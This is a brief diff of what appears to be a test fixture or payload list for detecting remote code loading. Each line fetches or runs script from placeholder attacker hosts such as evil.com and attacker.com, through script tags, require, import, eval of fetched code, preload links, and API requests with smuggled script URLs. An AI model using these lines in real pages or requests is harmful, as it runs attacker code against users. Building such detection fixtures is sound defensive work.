@@ -1,4 +1,10 @@
 <script src="http://evil.com/payload.js"></script>
-require('http://attacker.com/malicious-module')
-eval(fetch('http://evil.com/code').then(r=>r.text()))
+<script src="//attacker.com/hook.js"></script>
 import('//evil.com/module.js')
+require('http://attacker.com/malicious-module')
+eval(fetch('//evil.com/code').then(r=>r.text()))
+{"script":"http://evil.com/inject.js"}
+POST /api/template {"source":"http://attacker.com/template.html"}
+PUT /api/widget {"src":"//evil.com/widget.js"}
+<link rel="preload" href="//attacker.com/data.js" as="script">
+POST /api/load {"library":"http://evil.com/lib.min.js"}
